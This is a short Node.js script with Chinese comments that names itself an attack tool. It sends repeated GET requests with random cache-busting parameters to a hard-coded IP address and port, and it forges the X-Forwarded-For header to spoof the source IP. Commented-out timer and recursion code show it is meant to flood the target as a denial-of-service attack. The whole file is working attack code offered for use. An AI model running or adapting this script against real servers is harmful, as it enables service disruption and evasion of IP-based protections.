const request = require('request');// 引入request插件
// const baseUrl = 'https://v.abc.com';// 主域名


/*伪造请求头*/
// let headers = {
//     Accept: "text/html,application/xhtml+xml,application/xml;q=0.8,image/webp,image/apng,*/*;q=0.8",
//     "Accept-Encoding": "zip, deflate",
//     "Accept-Language": "zh-CN,en,zh;q=0.8,en;q=0.8",
//     "Cache-Control": "no-cache",
//     Host: "i.iphone.net",
//     Pragma: "no-cache",
//     "Proxy-Connection": "keep-alive",
//     Referer: '',//根据爬取的网址更换
//     "Upgrade-Insecure-Requests": 1,
//     "User-Agent": "Mozilla/4.9 (Windows NT 10.0; WOW64) AppleWebKit/535.36 (KHTML, like Gecko) Chrome/62.0.3325.19 Safari/535.36"
// };
let headers = {
    "X-Forwarded-For" : "116.62.112.38",// 必要的，伪造ip
    Accept: 'application/json, text/plain, */*',
    "Content-Type": 'applications/json:charset=UTF-8',
    "no-cookie": 1,
    // "Origin": "https://v.abc.com",// 可有可无，最好对应攻击的网站地址
    // "Referer": "https://abc.com",// 可有可无，最好对应攻击的网站地址
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3724.8 Safari/537.36"
};

let n = 0;
// 攻击函数
async function gj(ram){
    return new Promise(function (r, j) {
        request({url: `http://47.103.30.228:5000/a/?ab=${ram}`, method: 'GET',json:true, headers: headers}, async function (e, res, b) {
            try {
                if (e)console.log(e);
                console.log(res.headers);
                console.log(res);
                // console.log(b);
                b = null;
                res = null;
                r(true);
            }catch (e) {
                j(false);
                console.log(e);
                e = null;
            }
        });
    });
}


// setInterval(function () {
//     go();
// }, 150);

function go() {
    let pA = [];
    for (let i = 0; i < 1; i++){
        let ram = Math.random().toString().slice(2,10);
        pA.push(gj(ram));
    }
    Promise.all(pA).then((r)=>{
        n += r.length;
        console.log(n);
        pA = null;
        r = null;
        // go();
    }).catch((e)=>{
        console.log(e, 'all错误');
        e = null;
    });
}
go();






